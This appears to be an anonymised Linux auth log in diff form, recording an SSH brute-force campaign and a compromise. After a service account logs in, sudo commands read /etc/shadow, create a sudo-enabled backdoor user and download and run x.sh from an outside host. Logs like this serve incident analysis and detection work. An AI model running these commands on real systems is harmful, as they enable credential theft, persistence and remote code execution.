+Sep 22 02:28:04 HOST_1 sshd[24591]: Failed password for invalid user guest from IP_EXT_1 port 36623 ssh2
+Sep 22 02:28:04 HOST_1 sshd[24591]: Connection closed by invalid user guest IP_EXT_1 port 36623 [preauth]
+Sep 22 02:28:08 HOST_1 sshd[26592]: Failed password for USER_2 from IP_EXT_1 port 50936 ssh2
+Sep 22 02:28:08 HOST_1 sshd[26592]: Connection closed by authenticating user USER_2 IP_EXT_1 port 50936 [preauth]
+Sep 22 02:28:12 HOST_1 sshd[27538]: Invalid user nagios from IP_EXT_1 port 36812
+Sep 22 02:28:13 HOST_1 sshd[27538]: Failed password for invalid user nagios from IP_EXT_1 port 36812 ssh2
+Sep 22 02:28:13 HOST_1 sshd[27538]: Connection closed by invalid user nagios IP_EXT_1 port 36812 [preauth]
+Sep 22 02:28:15 HOST_1 sshd[29628]: Failed password for root from IP_EXT_1 port 48358 ssh2
+Sep 22 02:28:15 HOST_1 sshd[29628]: Connection closed by authenticating user root IP_EXT_1 port 48358 [preauth]
+Sep 22 02:28:18 HOST_1 sshd[24690]: Invalid user backup from IP_EXT_1 port 54411
+Sep 22 02:28:19 HOST_1 sshd[24690]: Failed password for invalid user backup from IP_EXT_1 port 54411 ssh2
+Sep 22 02:28:19 HOST_1 sshd[24690]: Connection closed by invalid user backup IP_EXT_1 port 54411 [preauth]
+Sep 22 02:28:23 HOST_1 sshd[27426]: Failed password for root from IP_EXT_1 port 53088 ssh2
+Sep 22 02:28:23 HOST_1 sshd[27426]: Connection closed by authenticating user root IP_EXT_1 port 53088 [preauth]
+Sep 22 02:28:28 HOST_1 sshd[28879]: Invalid user ubuntu from IP_EXT_1 port 58355
+Sep 22 02:28:29 HOST_1 sshd[28879]: Failed password for invalid user ubuntu from IP_EXT_1 port 58355 ssh2
+Sep 22 02:28:29 HOST_1 sshd[28879]: Connection closed by invalid user ubuntu IP_EXT_1 port 58355 [preauth]
+Sep 22 02:28:32 HOST_1 sshd[23323]: Failed password for root from IP_EXT_1 port 59573 ssh2
+Sep 22 02:28:32 HOST_1 sshd[23323]: Connection closed by authenticating user root IP_EXT_1 port 59573 [preauth]
+Sep 22 02:28:33 HOST_1 sshd[27748]: Invalid user admin from IP_EXT_1 port 43750
+Sep 22 02:28:34 HOST_1 sshd[27748]: Failed password for invalid user admin from IP_EXT_1 port 43750 ssh2
+Sep 22 02:28:34 HOST_1 sshd[27748]: Connection closed by invalid user admin IP_EXT_1 port 43750 [preauth]
+Sep 22 02:28:37 HOST_1 sshd[25507]: Invalid user ftpuser from IP_EXT_1 port 49190
+Sep 22 02:28:38 HOST_1 sshd[25507]: Failed password for invalid user ftpuser from IP_EXT_1 port 49190 ssh2
+Sep 22 02:28:38 HOST_1 sshd[25507]: Connection closed by invalid user ftpuser IP_EXT_1 port 49190 [preauth]
+Sep 22 02:28:39 HOST_1 sshd[24247]: Failed password for USER_2 from IP_EXT_1 port 35773 ssh2
+Sep 22 02:28:39 HOST_1 sshd[24247]: Connection closed by authenticating user USER_2 IP_EXT_1 port 35773 [preauth]
+Sep 22 02:28:40 HOST_1 sshd[22688]: Invalid user ubuntu from IP_EXT_1 port 54832
+Sep 22 02:28:41 HOST_1 sshd[22688]: Failed password for invalid user ubuntu from IP_EXT_1 port 54832 ssh2
+Sep 22 02:28:41 HOST_1 sshd[22688]: Connection closed by invalid user ubuntu IP_EXT_1 port 54832 [preauth]
+Sep 22 02:28:42 HOST_1 sshd[20813]: Invalid user test from IP_EXT_1 port 36577
+Sep 22 02:28:43 HOST_1 sshd[20813]: Failed password for invalid user test from IP_EXT_1 port 36577 ssh2
+Sep 22 02:28:43 HOST_1 sshd[20813]: Connection closed by invalid user test IP_EXT_1 port 36577 [preauth]
+Sep 22 02:28:43 HOST_1 sshd[20813]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 36577 ssh2 [preauth]
+Sep 22 02:28:45 HOST_1 sshd[28506]: Invalid user guest from IP_EXT_1 port 45398
+Sep 22 02:28:46 HOST_1 sshd[28506]: Failed password for invalid user guest from IP_EXT_1 port 45398 ssh2
+Sep 22 02:28:46 HOST_1 sshd[28506]: Connection closed by invalid user guest IP_EXT_1 port 45398 [preauth]
+Sep 22 02:28:49 HOST_1 sshd[20165]: Failed password for root from IP_EXT_1 port 48357 ssh2
+Sep 22 02:28:49 HOST_1 sshd[20165]: Connection closed by authenticating user root IP_EXT_1 port 48357 [preauth]
+Sep 22 02:28:52 HOST_1 sshd[24749]: Failed password for root from IP_EXT_1 port 35902 ssh2
+Sep 22 02:28:52 HOST_1 sshd[24749]: Connection closed by authenticating user root IP_EXT_1 port 35902 [preauth]
+Sep 22 02:28:54 HOST_1 sshd[20211]: Failed password for USER_2 from IP_EXT_1 port 40871 ssh2
+Sep 22 02:28:54 HOST_1 sshd[20211]: Connection closed by authenticating user USER_2 IP_EXT_1 port 40871 [preauth]
+Sep 22 02:28:58 HOST_1 sshd[26852]: Failed password for root from IP_EXT_1 port 47576 ssh2
+Sep 22 02:28:58 HOST_1 sshd[26852]: Connection closed by authenticating user root IP_EXT_1 port 47576 [preauth]
+Sep 22 02:29:02 HOST_1 sshd[21978]: Invalid user postgres from IP_EXT_1 port 44519
+Sep 22 02:29:03 HOST_1 sshd[21978]: Failed password for invalid user postgres from IP_EXT_1 port 44519 ssh2
+Sep 22 02:29:03 HOST_1 sshd[21978]: Connection closed by invalid user postgres IP_EXT_1 port 44519 [preauth]
+Sep 22 02:29:07 HOST_1 sshd[27453]: Failed password for root from IP_EXT_1 port 35962 ssh2
+Sep 22 02:29:07 HOST_1 sshd[27453]: Connection closed by authenticating user root IP_EXT_1 port 35962 [preauth]
+Sep 22 02:29:08 HOST_1 sshd[26920]: Failed password for USER_2 from IP_EXT_1 port 38128 ssh2
+Sep 22 02:29:08 HOST_1 sshd[26920]: Connection closed by authenticating user USER_2 IP_EXT_1 port 38128 [preauth]
+Sep 22 02:29:10 HOST_1 sshd[26104]: Failed password for root from IP_EXT_1 port 43012 ssh2
+Sep 22 02:29:10 HOST_1 sshd[26104]: Connection closed by authenticating user root IP_EXT_1 port 43012 [preauth]
+Sep 22 02:29:12 HOST_1 sshd[29750]: Failed password for USER_1 from IP_EXT_1 port 58298 ssh2
+Sep 22 02:29:12 HOST_1 sshd[29750]: Connection closed by authenticating user USER_1 IP_EXT_1 port 58298 [preauth]
+Sep 22 02:29:15 HOST_1 sshd[21517]: Invalid user postgres from IP_EXT_1 port 33602
+Sep 22 02:29:16 HOST_1 sshd[21517]: Failed password for invalid user postgres from IP_EXT_1 port 33602 ssh2
+Sep 22 02:29:16 HOST_1 sshd[21517]: Connection closed by invalid user postgres IP_EXT_1 port 33602 [preauth]
+Sep 22 02:29:20 HOST_1 sshd[26072]: Invalid user support from IP_EXT_1 port 48408
+Sep 22 02:29:21 HOST_1 sshd[26072]: Failed password for invalid user support from IP_EXT_1 port 48408 ssh2
+Sep 22 02:29:21 HOST_1 sshd[26072]: Connection closed by invalid user support IP_EXT_1 port 48408 [preauth]
+Sep 22 02:29:22 HOST_1 sshd[29011]: Failed password for root from IP_EXT_1 port 34201 ssh2
+Sep 22 02:29:22 HOST_1 sshd[29011]: Connection closed by authenticating user root IP_EXT_1 port 34201 [preauth]
+Sep 22 02:29:24 HOST_1 sshd[27242]: Invalid user nagios from IP_EXT_1 port 32876
+Sep 22 02:29:25 HOST_1 sshd[27242]: Failed password for invalid user nagios from IP_EXT_1 port 32876 ssh2
+Sep 22 02:29:25 HOST_1 sshd[27242]: Connection closed by invalid user nagios IP_EXT_1 port 32876 [preauth]
+Sep 22 02:29:29 HOST_1 sshd[23741]: Invalid user deploy from IP_EXT_1 port 55707
+Sep 22 02:29:30 HOST_1 sshd[23741]: Failed password for invalid user deploy from IP_EXT_1 port 55707 ssh2
+Sep 22 02:29:30 HOST_1 sshd[23741]: Connection closed by invalid user deploy IP_EXT_1 port 55707 [preauth]
+Sep 22 02:29:33 HOST_1 sshd[21953]: Invalid user nagios from IP_EXT_1 port 57597
+Sep 22 02:29:34 HOST_1 sshd[21953]: Failed password for invalid user nagios from IP_EXT_1 port 57597 ssh2
+Sep 22 02:29:34 HOST_1 sshd[21953]: Connection closed by invalid user nagios IP_EXT_1 port 57597 [preauth]
+Sep 22 02:29:39 HOST_1 sshd[25064]: Invalid user deploy from IP_EXT_1 port 56147
+Sep 22 02:29:40 HOST_1 sshd[25064]: Failed password for invalid user deploy from IP_EXT_1 port 56147 ssh2
+Sep 22 02:29:40 HOST_1 sshd[25064]: Connection closed by invalid user deploy IP_EXT_1 port 56147 [preauth]
+Sep 22 02:29:45 HOST_1 sshd[26290]: Failed password for root from IP_EXT_1 port 50609 ssh2
+Sep 22 02:29:45 HOST_1 sshd[26290]: Connection closed by authenticating user root IP_EXT_1 port 50609 [preauth]
+Sep 22 02:29:50 HOST_1 sshd[22967]: Failed password for root from IP_EXT_1 port 39000 ssh2
+Sep 22 02:29:50 HOST_1 sshd[22967]: Connection closed by authenticating user root IP_EXT_1 port 39000 [preauth]
+Sep 22 02:29:52 HOST_1 sshd[27839]: Invalid user test from IP_EXT_1 port 51579
+Sep 22 02:29:53 HOST_1 sshd[27839]: Failed password for invalid user test from IP_EXT_1 port 51579 ssh2
+Sep 22 02:29:53 HOST_1 sshd[27839]: Connection closed by invalid user test IP_EXT_1 port 51579 [preauth]
+Sep 22 02:29:57 HOST_1 sshd[20455]: Failed password for root from IP_EXT_1 port 38030 ssh2
+Sep 22 02:29:57 HOST_1 sshd[20455]: Connection closed by authenticating user root IP_EXT_1 port 38030 [preauth]
+Sep 22 02:30:01 HOST_1 CRON[3073]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 02:30:01 HOST_1 sshd[22802]: Invalid user oracle from IP_EXT_1 port 60239
+Sep 22 02:30:02 HOST_1 CRON[3073]: pam_unix(cron:session): session closed for user root
+Sep 22 02:30:02 HOST_1 sshd[22802]: Failed password for invalid user oracle from IP_EXT_1 port 60239 ssh2
+Sep 22 02:30:02 HOST_1 sshd[22802]: Connection closed by invalid user oracle IP_EXT_1 port 60239 [preauth]
+Sep 22 02:30:06 HOST_1 sshd[21509]: Invalid user admin from IP_EXT_1 port 33364
+Sep 22 02:30:07 HOST_1 sshd[21509]: Failed password for invalid user admin from IP_EXT_1 port 33364 ssh2
+Sep 22 02:30:07 HOST_1 sshd[21509]: Connection closed by invalid user admin IP_EXT_1 port 33364 [preauth]
+Sep 22 02:30:10 HOST_1 sshd[20370]: Failed password for root from IP_EXT_1 port 40753 ssh2
+Sep 22 02:30:10 HOST_1 sshd[20370]: Connection closed by authenticating user root IP_EXT_1 port 40753 [preauth]
+Sep 22 02:30:15 HOST_1 sshd[27104]: Failed password for root from IP_EXT_1 port 43068 ssh2
+Sep 22 02:30:15 HOST_1 sshd[27104]: Connection closed by authenticating user root IP_EXT_1 port 43068 [preauth]
+Sep 22 02:30:16 HOST_1 sshd[26237]: Failed password for USER_2 from IP_EXT_1 port 40309 ssh2
+Sep 22 02:30:16 HOST_1 sshd[26237]: Connection closed by authenticating user USER_2 IP_EXT_1 port 40309 [preauth]
+Sep 22 02:30:21 HOST_1 sshd[22567]: Invalid user backup from IP_EXT_1 port 45545
+Sep 22 02:30:22 HOST_1 sshd[22567]: Failed password for invalid user backup from IP_EXT_1 port 45545 ssh2
+Sep 22 02:30:22 HOST_1 sshd[22567]: Connection closed by invalid user backup IP_EXT_1 port 45545 [preauth]
+Sep 22 02:30:23 HOST_1 sshd[25567]: Invalid user support from IP_EXT_1 port 57564
+Sep 22 02:30:24 HOST_1 sshd[25567]: Failed password for invalid user support from IP_EXT_1 port 57564 ssh2
+Sep 22 02:30:24 HOST_1 sshd[25567]: Connection closed by invalid user support IP_EXT_1 port 57564 [preauth]
+Sep 22 02:30:26 HOST_1 sshd[23023]: Invalid user ubuntu from IP_EXT_1 port 52255
+Sep 22 02:30:27 HOST_1 sshd[23023]: Failed password for invalid user ubuntu from IP_EXT_1 port 52255 ssh2
+Sep 22 02:30:27 HOST_1 sshd[23023]: Connection closed by invalid user ubuntu IP_EXT_1 port 52255 [preauth]
+Sep 22 02:30:28 HOST_1 sshd[28059]: Failed password for SVC_1 from IP_EXT_1 port 44444 ssh2
+Sep 22 02:30:28 HOST_1 sshd[28059]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 44444 [preauth]
+Sep 22 02:30:29 HOST_1 sshd[27105]: Invalid user ubuntu from IP_EXT_1 port 40032
+Sep 22 02:30:30 HOST_1 sshd[27105]: Failed password for invalid user ubuntu from IP_EXT_1 port 40032 ssh2
+Sep 22 02:30:30 HOST_1 sshd[27105]: Connection closed by invalid user ubuntu IP_EXT_1 port 40032 [preauth]
+Sep 22 02:30:33 HOST_1 sshd[28062]: Invalid user nagios from IP_EXT_1 port 51526
+Sep 22 02:30:34 HOST_1 sshd[28062]: Failed password for invalid user nagios from IP_EXT_1 port 51526 ssh2
+Sep 22 02:30:34 HOST_1 sshd[28062]: Connection closed by invalid user nagios IP_EXT_1 port 51526 [preauth]
+Sep 22 02:30:38 HOST_1 sshd[25048]: Failed password for USER_1 from IP_EXT_1 port 56537 ssh2
+Sep 22 02:30:38 HOST_1 sshd[25048]: Connection closed by authenticating user USER_1 IP_EXT_1 port 56537 [preauth]
+Sep 22 02:30:39 HOST_1 sshd[21135]: Invalid user git from IP_EXT_1 port 36810
+Sep 22 02:30:40 HOST_1 sshd[21135]: Failed password for invalid user git from IP_EXT_1 port 36810 ssh2
+Sep 22 02:30:40 HOST_1 sshd[21135]: Connection closed by invalid user git IP_EXT_1 port 36810 [preauth]
+Sep 22 02:30:43 HOST_1 sshd[25948]: Failed password for USER_1 from IP_EXT_1 port 53622 ssh2
+Sep 22 02:30:43 HOST_1 sshd[25948]: Connection closed by authenticating user USER_1 IP_EXT_1 port 53622 [preauth]
+Sep 22 02:30:48 HOST_1 sshd[21460]: Invalid user git from IP_EXT_1 port 51169
+Sep 22 02:30:49 HOST_1 sshd[21460]: Failed password for invalid user git from IP_EXT_1 port 51169 ssh2
+Sep 22 02:30:49 HOST_1 sshd[21460]: Connection closed by invalid user git IP_EXT_1 port 51169 [preauth]
+Sep 22 02:30:52 HOST_1 sshd[20061]: Invalid user zabbix from IP_EXT_1 port 44699
+Sep 22 02:30:53 HOST_1 sshd[20061]: Failed password for invalid user zabbix from IP_EXT_1 port 44699 ssh2
+Sep 22 02:30:53 HOST_1 sshd[20061]: Connection closed by invalid user zabbix IP_EXT_1 port 44699 [preauth]
+Sep 22 02:30:55 HOST_1 sshd[20047]: Invalid user nagios from IP_EXT_1 port 44643
+Sep 22 02:30:56 HOST_1 sshd[20047]: Failed password for invalid user nagios from IP_EXT_1 port 44643 ssh2
+Sep 22 02:30:56 HOST_1 sshd[20047]: Connection closed by invalid user nagios IP_EXT_1 port 44643 [preauth]
+Sep 22 02:30:57 HOST_1 sshd[24872]: Invalid user guest from IP_EXT_1 port 53887
+Sep 22 02:30:58 HOST_1 sshd[24872]: Failed password for invalid user guest from IP_EXT_1 port 53887 ssh2
+Sep 22 02:30:58 HOST_1 sshd[24872]: Connection closed by invalid user guest IP_EXT_1 port 53887 [preauth]
+Sep 22 02:31:01 HOST_1 sshd[24031]: Failed password for USER_1 from IP_EXT_1 port 34841 ssh2
+Sep 22 02:31:01 HOST_1 sshd[24031]: Connection closed by authenticating user USER_1 IP_EXT_1 port 34841 [preauth]
+Sep 22 02:31:01 HOST_1 sshd[24031]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 34841 ssh2 [preauth]
+Sep 22 02:31:05 HOST_1 sshd[26835]: Failed password for USER_1 from IP_EXT_1 port 58853 ssh2
+Sep 22 02:31:05 HOST_1 sshd[26835]: Connection closed by authenticating user USER_1 IP_EXT_1 port 58853 [preauth]
+Sep 22 02:31:10 HOST_1 sshd[23395]: Failed password for root from IP_EXT_1 port 53666 ssh2
+Sep 22 02:31:10 HOST_1 sshd[23395]: Connection closed by authenticating user root IP_EXT_1 port 53666 [preauth]
+Sep 22 02:31:12 HOST_1 sshd[23801]: Invalid user zabbix from IP_EXT_1 port 49216
+Sep 22 02:31:13 HOST_1 sshd[23801]: Failed password for invalid user zabbix from IP_EXT_1 port 49216 ssh2
+Sep 22 02:31:13 HOST_1 sshd[23801]: Connection closed by invalid user zabbix IP_EXT_1 port 49216 [preauth]
+Sep 22 02:31:14 HOST_1 sshd[26587]: Failed password for root from IP_EXT_1 port 34844 ssh2
+Sep 22 02:31:14 HOST_1 sshd[26587]: Connection closed by authenticating user root IP_EXT_1 port 34844 [preauth]
+Sep 22 02:31:19 HOST_1 sshd[26790]: Failed password for root from IP_EXT_1 port 37048 ssh2
+Sep 22 02:31:19 HOST_1 sshd[26790]: Connection closed by authenticating user root IP_EXT_1 port 37048 [preauth]
+Sep 22 02:31:22 HOST_1 sshd[24132]: Failed password for root from IP_EXT_1 port 59281 ssh2
+Sep 22 02:31:22 HOST_1 sshd[24132]: Connection closed by authenticating user root IP_EXT_1 port 59281 [preauth]
+Sep 22 02:31:27 HOST_1 sshd[22532]: Invalid user oracle from IP_EXT_1 port 47129
+Sep 22 02:31:28 HOST_1 sshd[22532]: Failed password for invalid user oracle from IP_EXT_1 port 47129 ssh2
+Sep 22 02:31:28 HOST_1 sshd[22532]: Connection closed by invalid user oracle IP_EXT_1 port 47129 [preauth]
+Sep 22 02:31:33 HOST_1 sshd[26334]: Failed password for USER_1 from IP_EXT_1 port 48667 ssh2
+Sep 22 02:31:33 HOST_1 sshd[26334]: Connection closed by authenticating user USER_1 IP_EXT_1 port 48667 [preauth]
+Sep 22 02:31:35 HOST_1 sshd[20780]: Failed password for SVC_1 from IP_EXT_1 port 52801 ssh2
+Sep 22 02:31:35 HOST_1 sshd[20780]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 52801 [preauth]
+Sep 22 02:31:40 HOST_1 sshd[28152]: Failed password for USER_2 from IP_EXT_1 port 59765 ssh2
+Sep 22 02:31:40 HOST_1 sshd[28152]: Connection closed by authenticating user USER_2 IP_EXT_1 port 59765 [preauth]
+Sep 22 02:34:12 HOST_1 sshd[27412]: Accepted password for SVC_1 from IP_EXT_1 port 52110 ssh2
+Sep 22 02:34:12 HOST_1 sshd[27412]: pam_unix(sshd:session): session opened for user SVC_1(uid=1002) by (uid=0)
+Sep 22 02:34:12 HOST_1 systemd-logind[701]: New session 214 of user SVC_1.
+Sep 22 02:35:03 HOST_1 sudo[27455]: SVC_1 : TTY=pts/0 ; PWD=/home/SVC_1 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 22 02:35:03 HOST_1 sudo[27455]: pam_unix(sudo:session): session opened for user root(uid=0) by SVC_1(uid=1002)
+Sep 22 02:36:40 HOST_1 sudo[27471]: SVC_1 : TTY=pts/0 ; PWD=/home/SVC_1 ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash support2
+Sep 22 02:36:40 HOST_1 useradd[27472]: new group: name=support2, GID=1004
+Sep 22 02:36:40 HOST_1 useradd[27472]: new user: name=support2, UID=1004, GID=1004, home=/home/support2, shell=/bin/bash
+Sep 22 02:37:21 HOST_1 sudo[27480]: SVC_1 : TTY=pts/0 ; PWD=/home/SVC_1 ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo support2
+Sep 22 02:38:05 HOST_1 sudo[27489]: SVC_1 : TTY=pts/0 ; PWD=/home/SVC_1 ; USER=root ; COMMAND=/usr/bin/curl -s http://IP_EXT_2/x.sh -o /tmp/x.sh
+Sep 22 02:38:30 HOST_1 sudo[27492]: SVC_1 : TTY=pts/0 ; PWD=/home/SVC_1 ; USER=root ; COMMAND=/bin/chmod +x /tmp/x.sh
+Sep 22 02:39:10 HOST_1 sudo[27495]: SVC_1 : TTY=pts/0 ; PWD=/home/SVC_1 ; USER=root ; COMMAND=/tmp/x.sh
+Sep 22 02:41:02 HOST_1 sshd[27412]: Received disconnect from IP_EXT_1 port 52110:11: disconnected by user
+Sep 22 02:41:02 HOST_1 sshd[27412]: pam_unix(sshd:session): session closed for user SVC_1
+Sep 22 03:00:01 HOST_1 CRON[1031]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 03:00:02 HOST_1 CRON[1031]: pam_unix(cron:session): session closed for user root
+Sep 22 03:00:12 HOST_1 systemd[1]: Starting Daily apt download activities...
+Sep 22 03:30:01 HOST_1 CRON[3095]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 03:30:02 HOST_1 CRON[3095]: pam_unix(cron:session): session closed for user root
+Sep 22 04:00:01 HOST_1 CRON[1309]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 04:00:02 HOST_1 CRON[1309]: pam_unix(cron:session): session closed for user root
+Sep 22 04:30:01 HOST_1 CRON[3262]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 04:30:02 HOST_1 CRON[3262]: pam_unix(cron:session): session closed for user root
+Sep 22 05:00:01 HOST_1 CRON[3641]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 05:00:02 HOST_1 CRON[3641]: pam_unix(cron:session): session closed for user root
+Sep 22 05:30:01 HOST_1 CRON[3978]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 05:30:02 HOST_1 CRON[3978]: pam_unix(cron:session): session closed for user root
+Sep 22 06:00:01 HOST_1 CRON[3127]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 06:00:02 HOST_1 CRON[3127]: pam_unix(cron:session): session closed for user root
+Sep 22 06:25:04 HOST_1 systemd[1]: Starting Daily apt upgrade and clean activities...
+Sep 22 06:30:01 HOST_1 CRON[1159]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 06:30:02 HOST_1 CRON[1159]: pam_unix(cron:session): session closed for user root
+Sep 22 07:00:01 HOST_1 CRON[1267]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 07:00:02 HOST_1 CRON[1267]: pam_unix(cron:session): session closed for user root
+Sep 22 07:30:01 HOST_1 CRON[3996]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 07:30:02 HOST_1 CRON[3996]: pam_unix(cron:session): session closed for user root
+Sep 22 07:48:15 HOST_1 sshd[30906]: pam_google_authenticator(sshd:auth): Invalid verification code for USER_1
+Sep 22 07:48:15 HOST_1 sshd[30906]: Failed keyboard-interactive/pam for USER_1 from IP_INT_1 port 49332 ssh2
+Sep 22 07:48:52 HOST_1 sshd[30907]: Accepted keyboard-interactive/pam for USER_1 from IP_INT_1 port 49084 ssh2
+Sep 22 07:48:52 HOST_1 sshd[30907]: pam_unix(sshd:session): session opened for user USER_1(uid=1001) by (uid=0)
+Sep 22 08:05:09 HOST_1 sshd[31001]: Invalid user EMAIL_1 from IP_INT_1 port 44858
+Sep 22 08:05:11 HOST_1 sshd[31001]: Failed password for invalid user EMAIL_1 from IP_INT_1 port 48579 ssh2
+Sep 22 08:10:44 HOST_1 sshd[31022]: Invalid user [SECRET_SUPPRIME] from IP_INT_1 port 56003
+Sep 22 08:10:46 HOST_1 sshd[31022]: Failed password for invalid user [SECRET_SUPPRIME] from IP_INT_1 port 37423 ssh2
+Sep 22 08:11:30 HOST_1 sshd[31040]: Accepted keyboard-interactive/pam for USER_2 from IP_INT_1 port 40690 ssh2
+Sep 22 08:11:30 HOST_1 sshd[31040]: pam_unix(sshd:session): session opened for user USER_2(uid=1003) by (u
